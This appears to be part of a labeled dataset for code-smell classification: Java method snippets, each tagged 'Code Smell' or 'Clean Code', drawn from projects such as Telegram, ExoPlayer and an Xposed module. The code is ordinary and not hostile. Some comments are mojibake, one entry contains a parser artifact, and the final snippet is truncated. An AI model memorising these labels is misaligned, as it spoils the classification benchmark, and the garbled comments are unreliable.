public static ClassifierChainModel deserializeFromProto(int version,String className,Any message) throws InvalidProtocolBufferException {
  if (version < 0 || version > CURRENT_VERSION) {
    throw new IllegalArgumentException(""Unknown version "" + version + "", this class supports at most version ""+ CURRENT_VERSION);
  }
  ClassifierChainModelProto proto=message.unpack(ClassifierChainModelProto.class);
  ModelDataCarrier<?> carrier=ModelDataCarrier.deserialize(proto.getMetadata());
  if (!carrier.outputDomain().getOutput(0).getClass().equals(MultiLabel.class)) {
    throw new IllegalStateException(""Invalid protobuf, output domain is not a multi-label domain, found "" + carrier.outputDomain().getClass());
  }
  @SuppressWarnings(""unchecked"") ImmutableOutputInfo<MultiLabel> outputDomain=(ImmutableOutputInfo<MultiLabel>)carrier.outputDomain();
  if (proto.getLabelOrderCount() != outputDomain.size()) {
    throw new IllegalStateException(""Invalid protobuf, mismatch in number of labels, found "" + proto.getLabelOrderCount() + "" expected ""+ outputDomain.size());
  }
  if (proto.getLabelOrderCount() != proto.getModelsCount()) {
    throw new IllegalStateException(""Invalid protobuf, expected one model per label, found "" + proto.getModelsCount() + "" models and ""+ outputDomain.size()+ "" labels"");
  }
  List<Label> labelOrder=new ArrayList<>(proto.getLabelOrderCount());
  for (  OutputProto p : proto.getLabelOrderList()) {
    Output<?> output=Output.deserialize(p);
    if (output instanceof Label) {
      labelOrder.add((Label)output);
    }
 else {
      throw new IllegalStateException(""Invalid protobuf, expected label ordering, found "" + output.getClass());
    }
  }
  List<Model<Label>> models=new ArrayList<>(proto.getModelsCount());
  for (  ModelProto p : proto.getModelsList()) {
    Model<?> model=Model.deserialize(p);
    if (model.validate(Label.class)) {
      models.add(model.castModel(Label.class));
    }
 else {
      throw new IllegalStateException(""Invalid protobuf, expected all models to be classification, found "" + model);
    }
  }
  return new ClassifierChainModel(carrier.name(),carrier.provenance(),carrier.featureDomain(),outputDomain,labelOrder,models);
}",1,Code Smell
"private void processExportNode(Logger log,ByteBuffer buffer,byte[] cummulativeString,int curStrOffset,Map<String,ExportSymbol> map){
  int terminalSize=Utils.readULEB128(buffer).intValue();
  if (terminalSize != 0) {
    buffer.mark();
    int flags=Utils.readULEB128(buffer).intValue();
    long address;
    long other;
    String importName;
    if ((flags & EXPORT_SYMBOL_FLAGS_REEXPORT) != 0) {
      address=0;
      other=Utils.readULEB128(buffer).longValue();
      ByteArrayOutputStream baos=new ByteArrayOutputStream();
      byte b;
      while ((b=buffer.get()) != 0) {
        baos.write(b);
      }
      importName=baos.toString();
    }
 else {
      address=Utils.readULEB128(buffer).longValue();
      if ((flags & EXPORT_SYMBOL_FLAGS_STUB_AND_RESOLVER) != 0) {
        other=Utils.readULEB128(buffer).longValue();
      }
 else {
        other=0;
      }
      importName=null;
    }
    String symbolName=new String(cummulativeString,0,curStrOffset);
    map.put(symbolName,new ExportSymbol(symbolName,address,this,other,flags));
    if (log.isDebugEnabled()) {
      log.debug(""exportNode symbolName={}, address=0x{}, other=0x{}, importName={}, flags=0x{}"",symbolName,Long.toHexString(address),Long.toHexString(other),importName,Integer.toHexString(flags));
    }
    buffer.reset();
    buffer.position(buffer.position() + terminalSize);
  }
  int childrenCount=buffer.get() & 0xff;
  for (int i=0; i < childrenCount; i++) {
    int edgeStrLen=0;
    byte b;
    while ((b=buffer.get()) != 0) {
      cummulativeString[curStrOffset + edgeStrLen]=b;
      ++edgeStrLen;
    }
    cummulativeString[curStrOffset + edgeStrLen]=0;
    int childNodeOffset=Utils.readULEB128(buffer).intValue();
    ByteBuffer duplicate=buffer.duplicate();
    duplicate.position(childNodeOffset);
    processExportNode(log,duplicate,cummulativeString,curStrOffset + edgeStrLen,map);
  }
}
private Map<String,ExportSymbol> processExportNode(Logger log,MachO.DyldInfoCommand dyldInfoCommand,ByteBuffer buffer){
  if (dyldInfoCommand == null) {
    return Collections.emptyMap();
  }
  Map<String,ExportSymbol> map=new HashMap<>();
  if (dyldInfoCommand.exportSize() > 0) {
    buffer=buffer.duplicate();
    buffer.limit((int)(dyldInfoCommand.exportOff() + dyldInfoCommand.exportSize()));
    buffer.position((int)dyldInfoCommand.exportOff());
    processExportNode(log,buffer.slice(),new byte[4000],0,map);
  }
  return map;
}",1,Code Smell
"private void addParamVarKeys(List<String> varKeys,Params param){
  if (param != null) {
    for (    String key : param.getParamItemMap().keySet()) {
      if (!varKeys.contains(key)) {
        varKeys.add(key);
      }
    }
    for (    String key : subMapCache.keySet()) {
      if (!varKeys.contains(key)) {
        varKeys.add(key);
      }
    }
    for (    String key : param.getExtraProperties().keySet()) {
      if (!varKeys.contains(key)) {
        varKeys.add(key);
      }
    }
  }
}
",1,Code Smell
"/** 
 * sets up the utility with a map of known compressed to uncompressed suffix mappings and the default extension of the format.
 * @param uncompressSuffix Map from common file name suffixes ofcompressed files to the corresponding suffixes of uncompressed files. For example: from "".tgz"" to "".tar"".  This map also contains format-specific suffixes like "".gz"" and ""-z"".  These suffixes are mapped to the empty string, as they should simply be removed from the file name when the file is uncompressed.
 * @param defaultExtension the format's default extension like "".gz""
 */
public FileNameUtil(final Map<String,String> uncompressSuffix,final String defaultExtension){
  this.uncompressSuffix=Collections.unmodifiableMap(uncompressSuffix);
  int lc=Integer.MIN_VALUE, sc=Integer.MAX_VALUE;
  int lu=Integer.MIN_VALUE, su=Integer.MAX_VALUE;
  for (  final Map.Entry<String,String> ent : uncompressSuffix.entrySet()) {
    final int cl=ent.getKey().length();
    if (cl > lc) {
      lc=cl;
    }
    if (cl < sc) {
      sc=cl;
    }
    final String u=ent.getValue();
    final int ul=u.length();
    if (ul > 0) {
      if (!compressSuffix.containsKey(u)) {
        compressSuffix.put(u,ent.getKey());
      }
      if (ul > lu) {
        lu=ul;
      }
      if (ul < su) {
        su=ul;
      }
    }
  }
  longestCompressedSuffix=lc;
  longestUncompressedSuffix=lu;
  shortestCompressedSuffix=sc;
  shortestUncompressedSuffix=su;
  this.defaultExtension=defaultExtension;
}",0,Clean Code
"private void save(boolean force){
  if (selectedIds.size() == 0 && !force) {
    return;
  }
switch (type) {
case TYPE_CHANNEL:
    List<TLRPC.Chat> selectedChats=new ArrayList<>();
  for (  TLObject object : allSelectedObjects.values()) {
    if (object instanceof TLRPC.Chat && selectedIds.contains(-((TLRPC.Chat)object).id)) {
      selectedChats.add((TLRPC.Chat)object);
    }
  }
if (selectedObjectsListener != null) {
  selectedObjectsListener.onChatsSelected(selectedChats,true);
}
break;
case TYPE_USER:
List<TLRPC.User> selectedUsers=new ArrayList<>();
for (TLObject object : allSelectedObjects.values()) {
if (object instanceof TLRPC.User && selectedIds.contains(((TLRPC.User)object).id)) {
selectedUsers.add((TLRPC.User)object);
}
}
if (selectedObjectsListener != null) {
selectedObjectsListener.onUsersSelected(selectedUsers);
}
break;
case TYPE_COUNTRY:
List<TLRPC.TL_help_country> selectedCountries=new ArrayList<>();
for (TLRPC.TL_help_country country : countriesList) {
long id=country.default_name.hashCode();
if (selectedIds.contains(id)) {
selectedCountries.add(country);
}
}
if (selectedObjectsListener != null) {
selectedObjectsListener.onCountrySelected(selectedCountries);
}
break;
}
}",0,Clean Code
"private CharSequence fixIncorrectLength(final CharSequence before){
  int initialCheckLength=Math.min(3,before.length());
  if (initialCheckLength == 0)   return before;
  final CharSequence lastCharsInBefore=before.subSequence(before.length() - initialCheckLength,before.length());
  final CharSequence lastCharsBeforeCursor=getTextBeforeCursor(initialCheckLength,0);
  if (TextUtils.equals(lastCharsInBefore,lastCharsBeforeCursor))   return before;
  final int lastBeforeCodePoint=Character.codePointBefore(before,before.length());
  int lastBeforeLength=Character.charCount(lastBeforeCodePoint);
  final CharSequence codePointBeforeCursor=getTextBeforeCursor(lastBeforeLength,0);
  if (codePointBeforeCursor == null || codePointBeforeCursor.length() == 0)   return before;
  final CharSequence beforeWithoutLast=before.subSequence(0,before.length() - lastBeforeLength);
  final CharSequence beforeCursor=getTextBeforeCursor(beforeWithoutLast.length(),0);
  if (beforeCursor == null || beforeCursor.length() != beforeWithoutLast.length())   return before;
  if (TextUtils.equals(beforeCursor,beforeWithoutLast))   return beforeWithoutLast;
  return before;
}",0,Clean Code
"@Override public void drawComponent(TextGUIGraphics graphics,ProgressBar component){
  TerminalSize size=graphics.getSize();
  if (size.getRows() == 0 || size.getColumns() == 0) {
    return;
  }
  ThemeDefinition themeDefinition=component.getThemeDefinition();
  int columnOfProgress=(int)(component.getProgress() * size.getColumns());
  for (int row=0; row < size.getRows(); row++) {
    graphics.applyThemeStyle(themeDefinition.getActive());
    for (int column=0; column < size.getColumns(); column++) {
      if (column < columnOfProgress) {
        graphics.setCharacter(column,row,themeDefinition.getCharacter(""FILLER"",' '));
      }
    }
  }
}",0,Clean Code
"public GuidedActionsStylist.ViewHolder findSubChildViewHolder(View v){
  if (getRecyclerView() == null) {
    return null;
  }
  GuidedActionsStylist.ViewHolder result=null;
  ViewParent parent=v.getParent();
  while (parent != getRecyclerView() && parent != null && v != null) {
    v=(View)parent;
    parent=parent.getParent();
  }
  if (parent != null && v != null) {
    result=(GuidedActionsStylist.ViewHolder)getRecyclerView().getChildViewHolder(v);
  }
  return result;
}
",0,Clean Code
"@Override public boolean mouseReleased(double mouseX,double mouseY,int button){
  double s=mc.getWindow().getScaleFactor();
  mouseX*=s;
  mouseY*=s;
  if (button == GLFW.GLFW_MOUSE_BUTTON_LEFT)   pressed=false;
  if (addedHoveredToSelectionWhenClickedElement != null) {
    selection.remove(addedHoveredToSelectionWhenClickedElement);
    addedHoveredToSelectionWhenClickedElement=null;
  }
  if (moved) {
    if (button == GLFW.GLFW_MOUSE_BUTTON_LEFT && !dragging)     fillSelection((int)mouseX,(int)mouseY);
  }
 else {
    if (button == GLFW.GLFW_MOUSE_BUTTON_LEFT) {
      HudElement hovered=getHovered((int)mouseX,(int)mouseY);
      if (hovered != null)       hovered.toggle();
    }
 else     if (button == GLFW.GLFW_MOUSE_BUTTON_RIGHT) {
      HudElement hovered=getHovered((int)mouseX,(int)mouseY);
      if (hovered != null)       mc.setScreen(new HudElementScreen(theme,hovered));
 else       mc.setScreen(new AddHudElementScreen(theme,lastMouseX,lastMouseY));
    }
  }
  if (button == GLFW.GLFW_MOUSE_BUTTON_LEFT) {
    snapper.unsnap();
    moved=dragging=false;
  }
  return false;
}
",0,Clean Code
"/** 
 * Given viewport dimensions and video dimensions, computes the maximum size of the video as it will be rendered to fit inside of the viewport.
 */
private static Point getMaxVideoSizeInViewport(boolean orientationMayChange,int viewportWidth,int viewportHeight,int videoWidth,int videoHeight){
  if (orientationMayChange && (videoWidth > videoHeight) != (viewportWidth > viewportHeight)) {
    int tempViewportWidth=viewportWidth;
    viewportWidth=viewportHeight;
    viewportHeight=tempViewportWidth;
  }
  if (videoWidth * viewportHeight >= videoHeight * viewportWidth) {
    return new Point(viewportWidth,Util.ceilDivide(viewportWidth * videoHeight,videoWidth));
  }
 else {
    return new Point(Util.ceilDivide(viewportHeight * videoWidth,videoHeight),viewportHeight);
  }
}
",0,Clean Code
"public static String findAnimatedEmojiEmoticon(TLRPC.Document document){
  return findAnimatedEmojiEmoticon(document,""\uD83D\uDE00"");
}
public static String findAnimatedEmojiEmoticon(TLRPC.Document document,String fallback){
  return findAnimatedEmojiEmoticon(document,fallback,null);
}
public static String findAnimatedEmojiEmoticon(TLRPC.Document document,String fallback,Integer currentAccountForFull){
  if (document == null) {
    return fallback;
  }
  for (int a=0, N=document.attributes.size(); a < N; a++) {
    TLRPC.DocumentAttribute attribute=document.attributes.get(a);
    if (attribute instanceof TLRPC.TL_documentAttributeCustomEmoji || attribute instanceof TLRPC.TL_documentAttributeSticker) {
      if (currentAccountForFull != null) {
        TLRPC.TL_messages_stickerSet set=MediaDataController.getInstance(currentAccountForFull).getStickerSet(attribute.stickerset,true);
        StringBuilder emoji=new StringBuilder("""");
        if (set != null && set.packs != null) {
          for (int p=0; p < set.packs.size(); ++p) {
            TLRPC.TL_stickerPack pack=set.packs.get(p);
            if (pack.documents.contains(document.id)) {
              emoji.append(pack.emoticon);
            }
          }
        }
        if (!TextUtils.isEmpty(emoji)) {
          return emoji.toString();
        }
      }
      return attribute.alt;
    }
  }
  return fallback;
}",0,Clean Code
"/** 
 * Don't call this method directly.
 */
public static void innerDestroy(){
  if (Objects.nonNull(serviceSdkContext)) {
    try {
      if (Objects.nonNull(providerAPI)) {
        ((AutoCloseable)providerAPI).close();
        providerAPI=null;
      }
      if (Objects.nonNull(losslessAPI)) {
        ((AutoCloseable)losslessAPI).close();
        losslessAPI=null;
      }
      if (Objects.nonNull(consumerAPI)) {
        ((AutoCloseable)consumerAPI).close();
        consumerAPI=null;
      }
      if (Objects.nonNull(routerAPI)) {
        ((Destroyable)routerAPI).destroy();
        routerAPI=null;
      }
      if (Objects.nonNull(circuitBreakAPI)) {
        ((Destroyable)circuitBreakAPI).destroy();
        circuitBreakAPI=null;
      }
      if (Objects.nonNull(limitAPI)) {
        ((AutoCloseable)limitAPI).close();
        limitAPI=null;
      }
      if (Objects.nonNull(assemblyAPI)) {
        ((Destroyable)assemblyAPI).destroy();
        assemblyAPI=null;
      }
      if (Objects.nonNull(serviceSdkContext)) {
        serviceSdkContext.destroy();
        serviceSdkContext=null;
      }
      LOG.info(""Polaris SDK context is destroyed."");
    }
 catch (    Throwable throwable) {
      LOG.error(""destroy Polaris SDK context failed."",throwable);
    }
  }
}
",0,Clean Code
"@Override public CustomItemData readItemMappingEntry(JsonNode node) throws InvalidCustomMappingsFileException {
  if (node == null || !node.isObject()) {
    throw new InvalidCustomMappingsFileException(""Invalid item mappings entry"");
  }
  JsonNode name=node.get(""name"");
  if (name == null || !name.isTextual() || name.asText().isEmpty()) {
    throw new InvalidCustomMappingsFileException(""An item entry has no name"");
  }
  CustomItemData.Builder customItemData=CustomItemData.builder().name(name.asText()).customItemOptions(this.readItemCustomItemOptions(node));
  if (node.has(""display_name"")) {
    customItemData.displayName(node.get(""display_name"").asText());
  }
  if (node.has(""icon"")) {
    customItemData.icon(node.get(""icon"").asText());
  }
  if (node.has(""creative_category"")) {
    customItemData.creativeCategory(node.get(""creative_category"").asInt());
  }
  if (node.has(""creative_group"")) {
    customItemData.creativeGroup(node.get(""creative_group"").asText());
  }
  if (node.has(""allow_offhand"")) {
    customItemData.allowOffhand(node.get(""allow_offhand"").asBoolean());
  }
  if (node.has(""display_handheld"")) {
    customItemData.displayHandheld(node.get(""display_handheld"").asBoolean());
  }
  if (node.has(""texture_size"")) {
    customItemData.textureSize(node.get(""texture_size"").asInt());
  }
  if (node.has(""render_offsets"")) {
    JsonNode tmpNode=node.get(""render_offsets"");
    customItemData.renderOffsets(fromJsonNode(tmpNode));
  }
  if (node.get(""tags"") instanceof ArrayNode) {
    Set<String> tagsSet=new ObjectOpenHashSet<>();
    tags.forEach(tag -> tagsSet.add(tag.asText()));
    customItemData.tags(tagsSet);
  }
  return customItemData.build();
}
",0,Clean Code
"/** 
 * 鍐橨SON鍊笺��
 * @param dataExchange
 * @param cn
 * @param columns
 * @param rs
 * @param exportContext
 * @param generator
 * @param columnIndex 琛屽彿锛屼互 {@code 1}寮�濮�
 * @param column
 * @param exportOption
 * @param jsonDataFormat
 * @param listener
 * @throws Throwable
 */
protected void writeJsonValue(JsonDataExport dataExchange,Connection cn,List<Column> columns,ResultSet rs,IndexFormatDataExchangeContext exportContext,JsonGenerator generator,int columnIndex,Column column,JsonDataExportOption exportOption,JsonDataFormat jsonDataFormat,TextDataExportListener listener) throws Throwable {
  String name=column.getName();
  Object value=null;
  try {
    value=getColumnValueSimple(cn,rs,column);
    if (value == null) {
      generator.writeNull(name);
    }
 else     if (value instanceof Number) {
      Number number=(Number)value;
      if (number instanceof Integer)       generator.write(name,number.intValue());
 else       if (number instanceof Long)       generator.write(name,number.longValue());
 else       if (number instanceof Float || number instanceof Double)       generator.write(name,number.doubleValue());
 else       if (number instanceof BigDecimal)       generator.write(name,(BigDecimal)number);
 else       if (number instanceof BigInteger)       generator.write(name,(BigInteger)number);
 else       generator.write(name,number.intValue());
    }
 else     if (value instanceof Date) {
      DataFormatContext dataFormatContext=exportContext.getDataFormatContext();
      String valueStr=null;
      if (value instanceof java.sql.Date)       valueStr=dataFormatContext.formatDate((java.sql.Date)value);
 else       if (value instanceof java.sql.Time)       valueStr=dataFormatContext.formatTime((Time)value);
 else       if (value instanceof java.sql.Timestamp)       valueStr=dataFormatContext.formatTimestamp((Timestamp)value);
 else       valueStr=dataFormatContext.formatDate((java.sql.Date)value);
      if (valueStr == null)       generator.writeNull(name);
 else       generator.write(name,valueStr);
    }
 else     if (value instanceof String) {
      generator.write(name,(String)value);
    }
 else     if (value instanceof Boolean) {
      generator.write(name,(Boolean)value);
    }
 else     if (value instanceof byte[]) {
      String valueStr=exportContext.getDataFormatContext().formatBytes((byte[])value);
      if (valueStr == null)       generator.writeNull(name);
 else       generator.write(name,valueStr);
    }
 else {
      generator.write(name,value.toString());
    }
  }
 catch (  Throwable t) {
    if (exportOption.isNullForIllegalColumnValue()) {
      generator.writeNull(name);
      if (listener != null)       listener.onSetNullTextValue(exportContext.getDataIndex(),column.getName(),wrapToDataExchangeException(t));
    }
 else     throw t;
  }
}",0,Clean Code
"/** 
 * @api {post} /apps/:appId/helm 鏂板HELM缁勪欢
 * @apiName PostApplicationHelmMetaList
 * @apiGroup 搴旂敤鍏宠仈HELM缁勪欢 API
 * @apiParam (Path Parameters) {String} appId 搴旂敤ID
 * @apiParam (JSON Body) {String} helmPackageId HELM缁勪欢鍖匢D
 * @apiParam (JSON Body) {String} name HELM缁勪欢鍚嶇О
 * @apiParam (JSON Body) {String=""REPO"",""FILE"",""HUB""} packageType 鍖呯被鍨�
 * @apiParam (JSON Body) {String} helmExt 鎵╁睍淇℃伅
 * @apiParam (JSON Body) {String} options 鏋勫缓options淇℃伅
 * @apiParam (JSON Body) {String} description 鎻忚堪淇℃伅
 */
@PostMapping public TeslaBaseResult create(@PathVariable String appId,@RequestBody HelmMetaCreateReq request,@RequestHeader(value=""X-Biz-App"",required=false) String headerBizApp){
  request.checkParameters();
  BizAppContainer container=BizAppContainer.valueOf(headerBizApp);
  String namespaceId=container.getNamespaceId();
  String stageId=container.getStageId();
  request.setNamespaceId(namespaceId);
  request.setStageId(stageId);
  request.setAppId(appId);
  request.checkReq();
  HelmMetaDTO result=metaProvider.create(request);
  return buildSucceedResult(result);
}
",0,Clean Code
"/** 
 * Called when menu is fully dismissed
 */
public void onDismiss(){
  setVisibility(GONE);
  needCloseConfirmation=false;
  overrideActionBarBackground=0;
  overrideActionBarBackgroundProgress=0;
  actionBarPaint.setColor(getColor(Theme.key_windowBackgroundWhite));
  webViewContainer.destroyWebView();
  swipeContainer.removeView(webViewContainer);
  webViewContainer=new BotWebViewContainer(getContext(),parentEnterView.getParentFragment().getResourceProvider(),getColor(Theme.key_windowBackgroundWhite));
  webViewContainer.setDelegate(webViewDelegate);
  webViewContainer.setWebViewProgressListener(progress -> {
    progressView.setLoadProgressAnimated(progress);
    if (progress == 1f) {
      ValueAnimator animator=ValueAnimator.ofFloat(1,0).setDuration(200);
      animator.setInterpolator(CubicBezierInterpolator.DEFAULT);
      animator.addUpdateListener(animation -> progressView.setAlpha((Float)animation.getAnimatedValue()));
      animator.addListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          progressView.setVisibility(GONE);
        }
      }
);
      animator.start();
    }
  }
);
  swipeContainer.addView(webViewContainer);
  isLoaded=false;
  AndroidUtilities.cancelRunOnUIThread(pollRunnable);
  boolean delayRestoreText=botWebViewButtonWasVisible;
  if (botWebViewButtonWasVisible) {
    botWebViewButtonWasVisible=false;
    animateBotButton(false);
  }
  AndroidUtilities.runOnUIThread(() -> {
    if (savedEditText != null && parentEnterView.getEditField() != null) {
      parentEnterView.getEditField().setText(savedEditText);
      savedEditText=null;
    }
    if (savedReplyMessageObject != null) {
      ChatActivity chatActivity=parentEnterView.getParentFragment();
      if (chatActivity != null) {
        chatActivity.showFieldPanelForReply(savedReplyMessageObject);
      }
      savedReplyMessageObject=null;
    }
    if (savedEditMessageObject != null) {
      ChatActivity chatActivity=parentEnterView.getParentFragment();
      if (chatActivity != null) {
        chatActivity.showFieldPanelForEdit(true,savedEditMessageObject);
      }
      savedEditMessageObject=null;
    }
  }
,delayRestoreText ? 200 : 0);
}",0,Clean Code
"@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  MotionEvent ev=(MotionEvent)param.args[0];
  if (ev.getActionMasked() == ACTION_DOWN) {
    if (notWithinInsets(ev.getX(),ev.getY(),(Point)getObjectField(EdgeBackGestureHandler,""mDisplaySize""),getFloatField(EdgeBackGestureHandler,""mBottomGestureHeight""))) {
      setObjectField(EdgeBackGestureHandler,""mAllowGesture"",false);
      param.setResult(null);
    }
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  MotionEvent event=(MotionEvent)param.args[0];
  if (event.getAction() == ACTION_DOWN) {
    initialBackX=event.getX();
  }
  if (notWithinInsets(initialBackX,event.getY(),(Point)getObjectField(param.thisObject,""mDisplaySize""),0)) {
    param.setResult(null);
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (navPillColorAccent || colorReplaced) {
    setObjectField(param.thisObject,""mLightColor"",(navPillColorAccent) ? mContext.getResources().getColor(android.R.color.system_accent1_200,mContext.getTheme()) : mLightColor);
    setObjectField(param.thisObject,""mDarkColor"",(navPillColorAccent) ? mContext.getResources().getColor(android.R.color.system_accent1_600,mContext.getTheme()) : mDarkColor);
    colorReplaced=true;
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (widthFactor != 1f) {
    View result=(View)param.thisObject;
    ViewGroup.LayoutParams resultLayoutParams=result.getLayoutParams();
    int originalWidth;
    try {
      originalWidth=(int)getAdditionalInstanceField(param.thisObject,""originalWidth"");
    }
 catch (    Throwable ignored) {
      originalWidth=resultLayoutParams.width;
      setAdditionalInstanceField(param.thisObject,""originalWidth"",originalWidth);
    }
    resultLayoutParams.width=Math.round(originalWidth * widthFactor);
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (GesPillHeightFactor != 100) {
    mRadius=Math.round((float)getObjectField(param.thisObject,""mRadius""));
    setObjectField(param.thisObject,""mRadius"",Math.round(mRadius * GesPillHeightFactor / 100f));
  }
}",0,Clean Code
"public static AlertDialog showSecretLocationAlert(Context context,int currentAccount,final Runnable onSelectRunnable,boolean inChat,Theme.ResourcesProvider resourcesProvider){
  ArrayList<String> arrayList=new ArrayList<>();
  ArrayList<Integer> types=new ArrayList<>();
  int providers=5;
  if ((providers & 1) != 0) {
    arrayList.add(LocaleController.getString(""MapPreviewProviderTelegram"",R.string.MapPreviewProviderTelegram));
    types.add(0);
  }
  if ((providers & 2) != 0) {
    arrayList.add(LocaleController.getString(""MapPreviewProviderGoogle"",R.string.MapPreviewProviderGoogle));
    types.add(1);
  }
  if ((providers & 4) != 0) {
    arrayList.add(LocaleController.getString(""MapPreviewProviderYandex"",R.string.MapPreviewProviderYandex));
    types.add(3);
  }
  arrayList.add(LocaleController.getString(""MapPreviewProviderNobody"",R.string.MapPreviewProviderNobody));
  types.add(2);
  AlertDialog.Builder builder=new AlertDialog.Builder(context,resourcesProvider);
  builder.setTitle(LocaleController.getString(""MapPreviewProviderTitle"",R.string.MapPreviewProviderTitle));
  final LinearLayout linearLayout=new LinearLayout(context);
  linearLayout.setOrientation(LinearLayout.VERTICAL);
  builder.setView(linearLayout);
  for (int a=0; a < arrayList.size(); a++) {
    RadioColorCell cell=new RadioColorCell(context,resourcesProvider);
    cell.setPadding(dp(4),0,dp(4),0);
    cell.setTag(a);
    cell.setCheckColor(Theme.getColor(Theme.key_radioBackground),Theme.getColor(Theme.key_dialogRadioBackgroundChecked));
    cell.setTextAndValue(arrayList.get(a),SharedConfig.mapPreviewType == types.get(a));
    cell.setBackground(Theme.createSelectorDrawable(Theme.getColor(Theme.key_listSelector),Theme.RIPPLE_MASK_ALL));
    linearLayout.addView(cell);
    cell.setOnClickListener(v -> {
      Integer which=(Integer)v.getTag();
      SharedConfig.setSecretMapPreviewType(types.get(which));
      if (onSelectRunnable != null) {
        onSelectRunnable.run();
      }
      builder.getDismissRunnable().run();
    }
);
  }
  if (!inChat) {
    builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),null);
  }
  AlertDialog dialog=builder.show();
  if (inChat) {
    dialog.setCanceledOnTouchOutside(false);
  }
  return dialog;
}",0,Clean Code
"private CodeLocatorConfig(){
}
private CodeLocatorConfig(Builder builder){
  mAppInfoProvider=new AppInfoProviderWrapper(builder.mAppInfoProvider);
  mViewMaxLoopCount=builder.mViewMaxLoopCount <= 0 ? DEFAULT_VIEW_MAX_LOOP_TIMES : builder.mViewMaxLoopCount;
  mActivityMaxLoopCount=builder.mActivityMaxLoopCount <= 0 ? DEFAULT_ACTIVITY_MAX_LOOP_TIMES : builder.mActivityMaxLoopCount;
  mSkipSystemTraceCount=builder.mSkipSystemTraceCount <= 0 ? DEFAULT_SKIP_SYSTEM_TRACE_COUNT : builder.mSkipSystemTraceCount;
  mMaxShowInfoLogCount=builder.mMaxShowInfoLogCount <= 0 ? DEFAULT_MAX_SHOWINFO_LOG_COUNT : builder.mMaxShowInfoLogCount;
  mCodeLocatorProcessors=builder.mCodeLocatorProcessors == null ? Collections.EMPTY_SET : builder.mCodeLocatorProcessors;
  mMaxBroadcastTransferLength=builder.mMaxBroadcastTransferLength <= 0 ? DEFAULT_MAX_BROADCAST_TRANSFER_LENGTH : builder.mMaxBroadcastTransferLength;
  mDebug=builder.mDebug;
  mEnable=builder.mEnable;
  mEnableLancetInfo=builder.mEnableLancetInfo;
  mLazyInit=builder.mLazyInit;
  mEnableHookInflater=builder.mEnableHookInflater;
  mFetchConfig=builder.mFetchConfig;
  if (builder.mViewIgnoreByClazzs != null) {
    mViewIgnoreByClazzs.addAll(builder.mViewIgnoreByClazzs);
  }
  if (builder.mViewReturnByKeyWords != null) {
    mViewReturnByKeyWords.addAll(builder.mViewReturnByKeyWords);
  }
  if (builder.mToastIgnoreByClazzs != null) {
    mToastIgnoreByClazzs.addAll(builder.mToastIgnoreByClazzs);
  }
  if (builder.mPopupIgnoreByClazzs != null) {
    mPopupIgnoreByClazzs.addAll(builder.mPopupIgnoreByClazzs);
  }
  if (builder.mViewReturnByClazzs != null) {
    mViewReturnByClazzs.addAll(builder.mViewReturnByClazzs);
  }
  if (builder.mDialogIgnoreByClazzs != null) {
    mDialogIgnoreByClazzs.addAll(builder.mDialogIgnoreByClazzs);
  }
  if (builder.mDialogReturnByClazzs != null) {
    mDialogReturnByClazzs.addAll(builder.mDialogReturnByClazzs);
  }
  if (builder.mViewIgnoreByKeyWords != null) {
    mViewIgnoreByKeyWords.addAll(builder.mViewIgnoreByKeyWords);
  }
  if (builder.mActivityIgnoreByKeyWords != null) {
    mActivityIgnoreByKeyWords.addAll(builder.mActivityIgnoreByKeyWords);
  }
  if (builder.mDialogIgnoreByKeyWords != null) {
    mDialogIgnoreByKeyWords.addAll(builder.mDialogIgnoreByKeyWords);
  }
  if (builder.mToastIgnoreByKeyWords != null) {
    mToastIgnoreByKeyWords.addAll(builder.mToastIgnoreByKeyWords);
  }
  if (builder.mActivityIgnoreByClazzs != null) {
    mActivityIgnoreByClazzs.addAll(builder.mActivityIgnoreByClazzs);
  }
  if (builder.mPopupIgnoreByKeyWords != null) {
    mPopupIgnoreByKeyWords.addAll(builder.mPopupIgnoreByKeyWords);
  }
}",0,Clean Code
"@Override public boolean sniff(ExtractorInput input) throws IOException, InterruptedException {
  input.peekFully(scratch.data,0,3);
  scratch.setPosition(0);
  if (scratch.readUnsignedInt24() != FLV_TAG) {
    return false;
  }
  input.peekFully(scratch.data,0,2);
  scratch.setPosition(0);
  if ((scratch.readUnsignedShort() & 0xFA) != 0) {
    return false;
  }
  input.peekFully(scratch.data,0,4);
  scratch.setPosition(0);
  int dataOffset=scratch.readInt();
  input.resetPeekPosition();
  input.advancePeekPosition(dataOffset);
  input.peekFully(scratch.data,0,4);
  scratch.setPosition(0);
  return scratch.readInt() == 0;
}",0,Clean Code
"public void postResumeSuggestions(final boolean shouldDelay){
  final LatinIME latinIme=getOwnerInstance();
  if (latinIme == null) {
    return;
  }
  if (!latinIme.mSettings.getCurrent().isSuggestionsEnabledPerUserSettings()) {
    return;
  }
  removeMessages(MSG_RESUME_SUGGESTIONS);
  final int message=MSG_RESUME_SUGGESTIONS;
  if (shouldDelay) {
    sendMessageDelayed(obtainMessage(message),mDelayInMillisecondsToUpdateSuggestions);
  }
 else {
    sendMessage(obtainMessage(message));
  }
}
",0,Clean Code
"/** 
 * https://github.com/tommyettinger/BlazingChain
 */
public static String LZ64Decrypt(String str){
  final char[] valStrBase64=new char[]{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,62,0,0,0,63,52,53,54,55,56,57,58,59,60,61,0,0,0,64,0,0,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,0,0,0,0,0,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51};
  if (str == null) {
    return null;
  }
  if (str.isEmpty()) {
    return """";
  }
  final char[] input=str.toCharArray();
  return LZ64Decrypt(input.length,32,input,valStrBase64,0);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@945e97d",0,Clean Code
"private void validateSeckillConfigExists(Long id){
  if (seckillConfigMapper.selectById(id) == null) {
    throw exception(SECKILL_CONFIG_NOT_EXISTS);
  }
}
@Override public void validateSeckillConfigExists(Collection<Long> ids){
